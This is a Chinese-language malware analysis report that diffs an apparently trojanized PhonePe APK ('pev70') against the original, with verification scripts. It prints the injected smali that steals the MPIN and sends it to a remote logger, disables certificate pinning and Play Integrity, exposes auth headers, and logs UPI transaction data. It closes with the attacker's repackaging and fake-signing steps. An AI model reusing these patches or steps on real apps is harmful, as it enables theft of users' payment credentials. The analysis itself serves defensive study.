# pev70 DEX 字节码篡改 - 详细 SMALI Diff 对比

> 本文档提供每个被篡改 smali 文件的详细差异对比，以及核查命令
> 生成时间：2026-01-29

---

## 目录

1. [文件位置说明](#文件位置说明)
2. [核查方法](#核查方法)
3. [详细 Diff 对比](#详细-diff-对比)
   - [3.1 PhonePeApplication.smali](#31-phonpeapplicationsmali)
   - [3.2 MpinHurdleViewModel.smali](#32-mpinhurdleviewmodelsmali)
   - [3.3 OkHttpClient$Builder.smali](#33-okhttpclientbuildersmali)
   - [3.4 CertificatePinner.smali](#34-certificatepinnersmali)
   - [3.5 Util.smali (OkHttp)](#35-utilsmali-okhttp)
   - [3.6 Request$Builder.smali](#36-requestbuildersmali)
   - [3.7 OkHttpClient.smali (WebSocket)](#37-okhttpclientsmali-websocket)
   - [3.8 PlayIntegrityConfigProviderImpl.smali](#38-playintegrityconfigproviderimplsmali)
   - [3.9 CLServices.smali](#39-clservicessmali)
   - [3.10 CLRemoteResultReceiver.smali](#310-clremoteresultreceiversmali)
4. [攻击者使用的技术手段](#攻击者使用的技术手段)
5. [APK 重打包方法](#apk-重打包方法)

---

## 文件位置说明

| 变量 | 路径 |
|------|------|
| `$ORIG` | `/Users/danielscai/Documents/印度支付/apk包-研究/phonepe_original_apktool` |
| `$PEV70` | `/Users/danielscai/Documents/印度支付/apk包-研究/pev70_apktool` |

---

## 核查方法

### 使用 diff 命令对比

```bash
# 设置路径变量
export ORIG="/Users/danielscai/Documents/印度支付/apk包-研究/phonepe_original_apktool"
export PEV70="/Users/danielscai/Documents/印度支付/apk包-研究/pev70_apktool"

# 使用 diff 对比两个文件
diff -u "$ORIG/path/to/file.smali" "$PEV70/path/to/file.smali"

# 使用 vimdiff 可视化对比
vimdiff "$ORIG/path/to/file.smali" "$PEV70/path/to/file.smali"
```

### 使用 grep 查找关键注入代码

```bash
# 查找所有 zerolog 调用
grep -r "Lcom/zerolog/Z;" $PEV70 --include="*.smali"

# 查找所有 HookUtil 调用
grep -r "Lcom/PhonePeTweak/Def/HookUtil;" $PEV70 --include="*.smali"

# 查找所有 Pine 框架调用
grep -r "Ltop/canyie/pine" $PEV70 --include="*.smali"
```

---

## 详细 Diff 对比

### 3.1 PhonePeApplication.smali

**文件路径**
- 原始: `$ORIG/smali_classes3/com/phonepe/app/PhonePeApplication.smali`
- pev70: `$PEV70/smali/com/phonepe/app/PhonePeApplication.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes3/com/phonepe/app/PhonePeApplication.smali" \
        "$PEV70/smali/com/phonepe/app/PhonePeApplication.smali" | head -200
```

**关键差异 - attachBaseContext() 方法**

原始代码（简化版）:
```smali
.method public attachBaseContext(Landroid/content/Context;)V
    invoke-super {p0, p1}, Landroidx/multidex/MultiDexApplication;->attachBaseContext(...)V
    invoke-static {p0}, Lcom/google/android/play/core/splitcompat/SplitCompat;->install(...)Z
    return-void
.end method
```

pev70 注入代码（attachBaseContext 方法末尾）:
```smali
    # ===== 注入代码开始 =====

    # 打印日志标记
    const-string p1, "PhonePeTweak"
    const-string v0, "attachBaseContext"
    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    # 初始化 Pine Hook 框架
    invoke-static {}, Ltop/canyie/pine/Pine;->ensureInitialized()V

    # 获取 android_id
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object p1
    const-string v0, "android_id"
    invoke-static {p1, v0}, Landroid/provider/Settings$Secure;->getString(...)Ljava/lang/String;
    move-result-object v0

    # 初始化 zerolog 远程日志系统
    const-string p1, ""
    const/4 v1, 0x0
    invoke-static {v0, p1, v1}, Lcom/zerolog/Z;->InitConfig(Ljava/lang/String;Ljava/lang/String;Lorg/json/JSONObject;)V

    # 启动 Plugin 系统
    invoke-static {p0}, Lcom/myairtelapp/plugin/Plugin;->attach(Landroid/content/Context;)V

    # ===== 注入代码结束 =====
    return-void
```

**功能说明**:
1. 初始化 **Pine** 框架 - 用于 ART 级别方法 hook
2. 初始化 **zerolog** - 远程日志系统，通过 OTLP 协议外泄数据到 C2
3. 启动 **Plugin** 系统 - 注册各种方法钩子

---

### 3.2 MpinHurdleViewModel.smali

**文件路径**
- 原始: `$ORIG/smali_classes6/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali`
- pev70: `$PEV70/smali_classes2/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes6/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali" \
        "$PEV70/smali_classes2/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali" | head -300
```

**关键差异 - h6() 方法 (PIN 输入处理)**

原始代码:
```smali
.method public final h6(Ljava/lang/String;)V
    const-string v0, "pin"
    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V
    iget-object v0, p0, Lcom/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel;->_mPin:Lkotlinx/coroutines/flow/MutableStateFlow;
    invoke-interface {v0, p1}, Lkotlinx/coroutines/flow/MutableStateFlow;->setValue(Ljava/lang/Object;)V
    # ... 正常业务逻辑 ...
    return-void
.end method
```

pev70 注入代码:
```smali
.method public final h6(Ljava/lang/String;)V
    const-string v0, "pin"
    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V
    iget-object v0, p0, ...;->_mPin:Lkotlinx/coroutines/flow/MutableStateFlow;
    invoke-interface {v0, p1}, ...;->setValue(Ljava/lang/Object;)V

    # ===== 注入代码: PIN 窃取 =====
    invoke-virtual {p1}, Ljava/lang/String;->length()I
    move-result v1
    const/4 v2, 0x4
    if-ne v1, v2, :cond_skip_logging    # 仅当长度为4位时触发

    # 通过 zerolog 发送到远程服务器
    invoke-static {}, Lcom/zerolog/Z;->debug()Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string v1, "pin"
    invoke-virtual {v0, v1, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string/jumbo v1, "pin_input"
    invoke-virtual {v0, v1}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V

    # 存储到静态字段等待后续外泄
    sput-object p1, Lcom/PhonePeTweak/Def/PhonePeHelper;->LastMpin:Ljava/lang/String;

    :cond_skip_logging
    # ===== 注入代码结束 =====
    # ... 正常业务逻辑继续 ...
```

**功能说明**:
- 当用户输入完整 4 位 MPIN 时，立即通过 zerolog 发送到 C2 服务器
- 同时存储到 `PhonePeHelper.LastMpin` 静态字段，供其他模块使用

---

### 3.3 OkHttpClient$Builder.smali

**文件路径**
- 原始: `$ORIG/smali_classes9/okhttp3/OkHttpClient$Builder.smali`
- pev70: `$PEV70/smali_classes3/okhttp3/OkHttpClient$Builder.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/okhttp3/OkHttpClient\$Builder.smali" \
        "$PEV70/smali_classes3/okhttp3/OkHttpClient\$Builder.smali"
```

**关键差异 - build() 方法**

原始代码:
```smali
.method public build()Lokhttp3/OkHttpClient;
    .locals 1

    new-instance v0, Lokhttp3/OkHttpClient;
    invoke-direct {v0, p0}, Lokhttp3/OkHttpClient;-><init>(Lokhttp3/OkHttpClient$Builder;)V
    return-object v0
.end method
```

pev70 替换为:
```smali
.method public build()Lokhttp3/OkHttpClient;
    .locals 1

    # 调用 HookUtil.build() 替代原始构造
    invoke-static {p0}, Lcom/PhonePeTweak/Def/HookUtil;->build(Lokhttp3/OkHttpClient$Builder;)Lokhttp3/OkHttpClient;
    move-result-object v0
    return-object v0
.end method
```

**功能说明**:
- 完全替换 OkHttpClient 的构建过程
- `HookUtil.build()` 会在构建时注入自定义的 `LoggingInterceptor`
- 所有 HTTP 请求/响应都会被拦截并记录

---

### 3.4 CertificatePinner.smali

**文件路径**
- 原始: `$ORIG/smali_classes9/okhttp3/CertificatePinner.smali`
- pev70: `$PEV70/smali_classes3/okhttp3/CertificatePinner.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/okhttp3/CertificatePinner.smali" \
        "$PEV70/smali_classes3/okhttp3/CertificatePinner.smali"
```

**关键差异 1 - check() 方法**

原始代码（约 80+ 行，包含证书校验逻辑）:
```smali
.method public final check(Ljava/lang/String;Ljava/util/List;)V
    # ... 复杂的证书 PIN 校验逻辑 ...
    # 如果校验失败会抛出 SSLPeerUnverifiedException
.end method
```

pev70 替换为:
```smali
.method public final check(Ljava/lang/String;Ljava/util/List;)V
    .locals 2

    # 仅打印日志，不做任何校验
    invoke-static {}, Lcom/zerolog/Z;->info()Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string v1, "hostname"
    invoke-virtual {v0, v1, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string v1, "CertificatePinner check called"
    invoke-virtual {v0, v1}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V

    # 直接返回，绕过所有证书校验
    return-void
.end method
```

**关键差异 2 - findMatchingPins() 方法**

原始代码:
```smali
.method public final findMatchingPins(Ljava/lang/String;)Ljava/util/List;
    # ... 查找匹配的证书 PIN ...
.end method
```

pev70 替换为:
```smali
.method public final findMatchingPins(Ljava/lang/String;)Ljava/util/List;
    .locals 1

    # 始终返回空列表，使所有证书都"验证通过"
    sget-object v0, Ljava/util/Collections;->EMPTY_LIST:Ljava/util/List;
    return-object v0
.end method
```

**功能说明**:
- **完全禁用 SSL Certificate Pinning**
- 允许攻击者使用自己的 CA 证书进行 MITM 中间人攻击
- 所有 HTTPS 流量都可被拦截和解密

---

### 3.5 Util.smali (OkHttp)

**文件路径**
- 原始: `$ORIG/smali_classes9/okhttp3/internal/Util.smali`
- pev70: `$PEV70/smali_classes3/okhttp3/internal/Util.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/okhttp3/internal/Util.smali" \
        "$PEV70/smali_classes3/okhttp3/internal/Util.smali"
```

**关键差异 - isSensitiveHeader() 方法**

原始代码:
```smali
.method public static final isSensitiveHeader(Ljava/lang/String;)Z
    .locals 2
    # 检查 header 名称是否为敏感 header (Authorization, Cookie, Proxy-Authorization)
    # 返回 true 表示敏感，应被过滤/隐藏
    const-string v0, "Authorization"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    move-result v0
    if-nez v0, :cond_sensitive
    # ... 更多检查 ...
.end method
```

pev70 替换为:
```smali
.method public static final isSensitiveHeader(Ljava/lang/String;)Z
    .locals 1

    # 重定向到 HookUtil，始终返回 false
    invoke-static {p0}, Lcom/PhonePeTweak/Def/HookUtil;->isSensitiveHeader(Ljava/lang/String;)Z
    move-result v0
    return v0
.end method
```

**HookUtil.isSensitiveHeader() 实现**:
```java
public static boolean isSensitiveHeader(String name) {
    return false;  // 永远返回 false，暴露所有 header
}
```

**功能说明**:
- 使 Authorization, Cookie, Token 等敏感 header 不再被过滤
- 配合 LoggingInterceptor，可完整记录包括认证令牌在内的所有请求头

---

### 3.6 Request$Builder.smali

**文件路径**
- 原始: `$ORIG/smali_classes9/okhttp3/Request$Builder.smali`
- pev70: `$PEV70/smali_classes3/okhttp3/Request$Builder.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/okhttp3/Request\$Builder.smali" \
        "$PEV70/smali_classes3/okhttp3/Request\$Builder.smali"
```

**关键差异 - addHeader() 方法**

原始代码:
```smali
.method public final addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
    .locals 1

    iget-object v0, p0, Lokhttp3/Request$Builder;->headers:Lokhttp3/Headers$Builder;
    invoke-virtual {v0, p1, p2}, Lokhttp3/Headers$Builder;->add(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Headers$Builder;
    return-object p0
.end method
```

pev70 替换为:
```smali
.method public final addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
    .locals 1

    # 转发到 HookUtil 进行日志记录
    invoke-static {p0, p1, p2}, Lcom/PhonePeTweak/Def/HookUtil;->addHeader(Lokhttp3/Request$Builder;Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
    move-result-object v0
    return-object v0
.end method
```

**功能说明**:
- 每个添加的 HTTP header 都会被记录
- 可捕获 Authorization tokens, API keys, Session cookies 等

---

### 3.7 OkHttpClient.smali (WebSocket)

**文件路径**
- 原始: `$ORIG/smali_classes9/okhttp3/OkHttpClient.smali`
- pev70: `$PEV70/smali_classes3/okhttp3/OkHttpClient.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/okhttp3/OkHttpClient.smali" \
        "$PEV70/smali_classes3/okhttp3/OkHttpClient.smali"
```

**关键差异 - newWebSocket() 方法**

原始代码:
```smali
.method public final newWebSocket(Lokhttp3/Request;Lokhttp3/WebSocketListener;)Lokhttp3/WebSocket;
    .locals 2

    new-instance v0, Lokhttp3/internal/ws/RealWebSocket;
    # ... 直接使用原始 listener ...
    invoke-direct {v0, ..., p2}, Lokhttp3/internal/ws/RealWebSocket;-><init>(...)V
    # ...
.end method
```

pev70 注入代码:
```smali
.method public final newWebSocket(Lokhttp3/Request;Lokhttp3/WebSocketListener;)Lokhttp3/WebSocket;
    .locals 3

    # ===== 注入: 包装 WebSocket 监听器 =====
    new-instance v3, Lcom/PhonePeTweak/Def/LoggingWebSocketListener;
    invoke-direct {v3, p2}, Lcom/PhonePeTweak/Def/LoggingWebSocketListener;-><init>(Lokhttp3/WebSocketListener;)V

    # 使用包装后的 listener 替代原始 listener
    new-instance v0, Lokhttp3/internal/ws/RealWebSocket;
    # ... 使用 v3 (LoggingWebSocketListener) 替代 p2 ...
.end method
```

**功能说明**:
- 包装所有 WebSocket 连接的监听器
- `LoggingWebSocketListener` 会记录所有 WebSocket 消息
- 可监控实时通信数据（如交易状态更新）

---

### 3.8 PlayIntegrityConfigProviderImpl.smali

**文件路径**
- 原始: `$ORIG/smali_classes7/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali`
- pev70: `$PEV70/smali_classes3/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes7/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali" \
        "$PEV70/smali_classes3/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali"
```

**关键差异 - e() 方法 (isPlayIntegrityEnabled)**

原始代码:
```smali
.method public final e()Z
    .locals 2
    # 从配置中读取 Play Integrity 是否启用
    iget-object v0, p0, ...;->a:Lnn0/a;
    invoke-interface {v0}, Lnn0/a;->get()Ljava/lang/Object;
    move-result-object v0
    check-cast v0, LS40/d;
    # ... 返回配置值 ...
.end method
```

pev70 替换为:
```smali
.method public final e()Z
    .locals 1

    # 始终返回 false，禁用 Play Integrity 检查
    const/4 v0, 0x0
    return v0
.end method
```

**功能说明**:
- 禁用 Google Play Integrity API 检查
- 防止应用检测到自身被篡改
- 绕过设备完整性验证

---

### 3.9 CLServices.smali

**文件路径**
- 原始: `$ORIG/smali_classes9/org/npci/upi/security/services/CLServices.smali`
- pev70: `$PEV70/smali_classes3/org/npci/upi/security/services/CLServices.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/org/npci/upi/security/services/CLServices.smali" \
        "$PEV70/smali_classes3/org/npci/upi/security/services/CLServices.smali"
```

**关键差异 1 - 构造函数中的 Intent 创建**

原始代码（第124行）:
```smali
invoke-static {p1}, LM/w;->a(Ljava/lang/String;)Landroid/content/Intent;
```

pev70 版本:
```smali
invoke-static {p1}, LB/a;->d(Ljava/lang/String;)Landroid/content/Intent;
```

**关键差异 2 - getChallenge() 方法**

原始代码:
```smali
.method public getChallenge(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    # 参数校验
    if-eqz p1, :cond_1
    # ... 调用远程服务 ...
    :try_start_0
    iget-object v1, p0, ...;->clRemoteService:...
    invoke-interface {v1, p1, p2}, ...;->getChallenge(...)Ljava/lang/String;
    move-result-object v0
    :try_end_0
    :cond_1
    return-object v0
.end method
```

pev70 注入代码:
```smali
.method public getChallenge(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    if-eqz p1, :cond_0
    # ... 参数校验 ...

    :try_start_0
    iget-object v0, p0, ...;->clRemoteService:...
    invoke-interface {v0, p1, p2}, ...;->getChallenge(...)Ljava/lang/String;
    move-result-object v0

    # ===== 注入: 记录 UPI 挑战数据 =====
    invoke-static {}, Lcom/zerolog/Z;->info()Lcom/zerolog/Z$EventWrapper;
    move-result-object v1
    const-string/jumbo v2, "type"
    invoke-virtual {v1, v2, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object p1
    const-string v1, "deviceId"
    invoke-virtual {p1, v1, p2}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object p1
    const-string p2, "result"
    invoke-virtual {p1, p2, v0}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object p1
    const-string p2, "CLServices_getChallenge called with parameters"
    invoke-virtual {p1, p2}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V
    # ===== 注入结束 =====

    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-object v0

    :catch_0
    move-exception p1
    # 错误也被记录
    invoke-static {}, Lcom/zerolog/Z;->error()Lcom/zerolog/Z$EventWrapper;
    # ...
.end method
```

**关键差异 3 - registerApp() 方法**

pev70 在方法开头注入:
```smali
.method public registerApp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 7

    # ===== 注入: 记录 UPI 注册参数 =====
    invoke-static {}, Lcom/zerolog/Z;->info()Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string v1, "param"
    invoke-virtual {v0, v1, p1}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    move-result-object v0
    const-string v1, "param1"
    invoke-virtual {v0, v1, p2}, Lcom/zerolog/Z$EventWrapper;->str(...)Lcom/zerolog/Z$EventWrapper;
    # ... 记录 param2, param3, param4 ...
    const-string v1, "CLServices_registerApp called with parameters"
    invoke-virtual {v0, v1}, Lcom/zerolog/Z$EventWrapper;->msg(Ljava/lang/String;)V
    # ===== 注入结束 =====

    # 原始业务逻辑继续...
```

**功能说明**:
- **监控 NPCI UPI 安全服务调用**
- 记录 UPI 挑战(Challenge)数据、设备ID
- 记录应用注册参数
- 这些数据对于理解和攻击 UPI 安全机制至关重要

---

### 3.10 CLRemoteResultReceiver.smali

**文件路径**
- 原始: `$ORIG/smali_classes9/org/npci/upi/security/services/CLRemoteResultReceiver.smali`
- pev70: `$PEV70/smali_classes13/org/npci/upi/security/services/CLRemoteResultReceiver.smali`

**核查命令**
```bash
diff -u "$ORIG/smali_classes9/org/npci/upi/security/services/CLRemoteResultReceiver.smali" \
        "$PEV70/smali_classes13/org/npci/upi/security/services/CLRemoteResultReceiver.smali"
```

**关键差异 - 构造函数 <init>()**

原始代码:
```smali
.method public constructor <init>(Landroid/os/ResultReceiver;)V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    # 创建原始的内部类作为 Binder
    new-instance v0, Lorg/npci/upi/security/services/CLRemoteResultReceiver$1;
    invoke-direct {v0, p0}, Lorg/npci/upi/security/services/CLRemoteResultReceiver$1;-><init>(...)V
    iput-object v0, p0, ...;->mBinder:Landroid/os/IBinder;

    iput-object p1, p0, ...;->mResultReceiver:Landroid/os/ResultReceiver;
    return-void
.end method
```

pev70 替换为:
```smali
.method public constructor <init>(Landroid/os/ResultReceiver;)V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    # ===== 替换: 使用 LoggingCLResultReceiver 包装 =====
    new-instance v0, Lcom/PhonePeTweak/Def/LoggingCLResultReceiver;
    invoke-direct {v0, p1}, Lcom/PhonePeTweak/Def/LoggingCLResultReceiver;-><init>(Landroid/os/ResultReceiver;)V
    iput-object v0, p0, ...;->mBinder:Landroid/os/IBinder;
    # ===== 替换结束 =====

    iput-object p1, p0, ...;->mResultReceiver:Landroid/os/ResultReceiver;
    return-void
.end method
```

**功能说明**:
- 用 `LoggingCLResultReceiver` 包装原始的 ResultReceiver
- 可拦截所有 UPI 交易结果回调
- 监控交易成功/失败状态、交易金额、交易ID等

---

## 攻击者使用的技术手段

### 1. DEX 字节码静态篡改

| 技术 | 描述 |
|------|------|
| **方法替换** | 完全替换原始方法体（如 CertificatePinner.check()） |
| **方法注入** | 在原始方法开头/结尾插入代码（如 attachBaseContext()） |
| **调用重定向** | 将原始方法调用重定向到恶意包装器（如 HookUtil.build()） |
| **返回值篡改** | 修改返回值以绕过安全检查（如 isPlayIntegrityEnabled() 返回 false） |

### 2. Pine ART-Level Hook 框架

| 组件 | 功能 |
|------|------|
| **Pine.ensureInitialized()** | 初始化 ART 级别 inline hook 引擎 |
| **PineHelper** | 注册运行时方法钩子 |
| **优势** | 可在运行时 hook 任何 Java/Kotlin 方法，无需静态修改 |

### 3. 远程日志外泄系统 (zerolog)

| 组件 | 功能 |
|------|------|
| **Z.InitConfig()** | 初始化日志系统，配置 C2 服务器地址 |
| **Z.info()/debug()/error()** | 创建日志事件 |
| **EventWrapper.str()/bool()** | 添加结构化数据字段 |
| **EventWrapper.msg()** | 发送日志到 OTLP 服务器 |

### 4. 安全机制绕过

| 绕过目标 | 技术手段 |
|---------|---------|
| **SSL Pinning** | CertificatePinner.check() 直接返回，findMatchingPins() 返回空列表 |
| **Play Integrity** | isPlayIntegrityEnabled() 返回 false |
| **Header 过滤** | isSensitiveHeader() 返回 false |
| **签名校验** | 使用伪造证书重新签名 |

### 5. 数据拦截点

| 数据类型 | 拦截位置 | 拦截方法 |
|---------|---------|---------|
| **MPIN 密码** | MpinHurdleViewModel.h6() | zerolog + 静态字段存储 |
| **HTTP 请求/响应** | LoggingInterceptor | OkHttp 拦截器 |
| **HTTP Headers** | Request$Builder.addHeader() | HookUtil 包装 |
| **WebSocket 消息** | LoggingWebSocketListener | 监听器包装 |
| **UPI 交易** | CLServices + CLRemoteResultReceiver | zerolog + 结果包装 |

---

## APK 重打包方法

攻击者重打包 APK 的完整流程:

### 1. 反编译原始 APK

```bash
# 使用 apktool 反编译
apktool d PhonePe_v24.08.23.apk -o phonepe_original

# 或使用 jadx 获取 Java 源码参考
jadx PhonePe_v24.08.23.apk -d phonepe_jadx
```

### 2. 修改 smali 字节码

```bash
# 编辑 smali 文件
vim phonepe_original/smali_classes3/com/phonepe/app/PhonePeApplication.smali

# 插入恶意代码...
```

### 3. 添加恶意 DEX 文件

```bash
# 将恶意类编译为 DEX
dx --dex --output=malicious.dex malicious_classes/

# 作为新的 smali_classesN 目录添加
mkdir phonepe_original/smali_classes11
# 将恶意 smali 放入...
```

### 4. 重新构建 APK

```bash
# 使用 apktool 重新打包
apktool b phonepe_original -o phonepe_modified.apk
```

### 5. 对齐和签名

```bash
# 对齐 APK (优化)
zipalign -v 4 phonepe_modified.apk phonepe_aligned.apk

# 生成伪造密钥
keytool -genkeypair -v -keystore fake.keystore \
    -alias fake_key -keyalg RSA -keysize 2048 \
    -validity 73000 \
    -dname "CN=John Doe, OU=MyOrg, O=MyCompany, L=New York, ST=NY, C=US"

# 签名 APK
apksigner sign --ks fake.keystore \
    --ks-key-alias fake_key \
    --out pev70.apk \
    phonepe_aligned.apk
```

### 6. 验证签名

```bash
# 验证新签名
apksigner verify -v pev70.apk

# 查看签名信息
keytool -printcert -jarfile pev70.apk
```

---

## 快速核查脚本

将以下脚本保存为 `verify_diffs.sh` 并执行:

```bash
#!/bin/bash

ORIG="/Users/danielscai/Documents/印度支付/apk包-研究/phonepe_original_apktool"
PEV70="/Users/danielscai/Documents/印度支付/apk包-研究/pev70_apktool"

echo "===== 1. PhonePeApplication.smali ====="
diff -u "$ORIG/smali_classes3/com/phonepe/app/PhonePeApplication.smali" \
        "$PEV70/smali/com/phonepe/app/PhonePeApplication.smali" 2>/dev/null | head -50

echo ""
echo "===== 2. MpinHurdleViewModel.smali ====="
diff -u "$ORIG/smali_classes6/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali" \
        "$PEV70/smali_classes2/com/phonepe/login/common/ui/hurdle/viewmodel/MpinHurdleViewModel.smali" 2>/dev/null | head -50

echo ""
echo "===== 3. OkHttpClient\$Builder.smali ====="
diff -u "$ORIG/smali_classes9/okhttp3/OkHttpClient\$Builder.smali" \
        "$PEV70/smali_classes3/okhttp3/OkHttpClient\$Builder.smali" 2>/dev/null | head -50

echo ""
echo "===== 4. CertificatePinner.smali ====="
diff -u "$ORIG/smali_classes9/okhttp3/CertificatePinner.smali" \
        "$PEV70/smali_classes3/okhttp3/CertificatePinner.smali" 2>/dev/null | head -50

echo ""
echo "===== 5. Util.smali ====="
diff -u "$ORIG/smali_classes9/okhttp3/internal/Util.smali" \
        "$PEV70/smali_classes3/okhttp3/internal/Util.smali" 2>/dev/null | head -50

echo ""
echo "===== 6. Request\$Builder.smali ====="
diff -u "$ORIG/smali_classes9/okhttp3/Request\$Builder.smali" \
        "$PEV70/smali_classes3/okhttp3/Request\$Builder.smali" 2>/dev/null | head -50

echo ""
echo "===== 7. OkHttpClient.smali ====="
diff -u "$ORIG/smali_classes9/okhttp3/OkHttpClient.smali" \
        "$PEV70/smali_classes3/okhttp3/OkHttpClient.smali" 2>/dev/null | head -50

echo ""
echo "===== 8. PlayIntegrityConfigProviderImpl.smali ====="
diff -u "$ORIG/smali_classes7/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali" \
        "$PEV70/smali_classes3/com/phonepe/phonepecore/playintegrity/config/PlayIntegrityConfigProviderImpl.smali" 2>/dev/null | head -50

echo ""
echo "===== 9. CLServices.smali ====="
diff -u "$ORIG/smali_classes9/org/npci/upi/security/services/CLServices.smali" \
        "$PEV70/smali_classes3/org/npci/upi/security/services/CLServices.smali" 2>/dev/null | head -80

echo ""
echo "===== 10. CLRemoteResultReceiver.smali ====="
diff -u "$ORIG/smali_classes9/org/npci/upi/security/services/CLRemoteResultReceiver.smali" \
        "$PEV70/smali_classes13/org/npci/upi/security/services/CLRemoteResultReceiver.smali" 2>/dev/null | head -50

echo ""
echo "===== 查找所有 zerolog 调用 ====="
grep -r "Lcom/zerolog/Z;" "$PEV70" --include="*.smali" | wc -l
echo "个文件包含 zerolog 调用"

echo ""
echo "===== 查找所有 HookUtil 调用 ====="
grep -r "Lcom/PhonePeTweak/Def/HookUtil;" "$PEV70" --include="*.smali" | wc -l
echo "个文件包含 HookUtil 调用"
```

---

> 文档生成完成。使用上述核查命令和脚本可以验证每个篡改点。
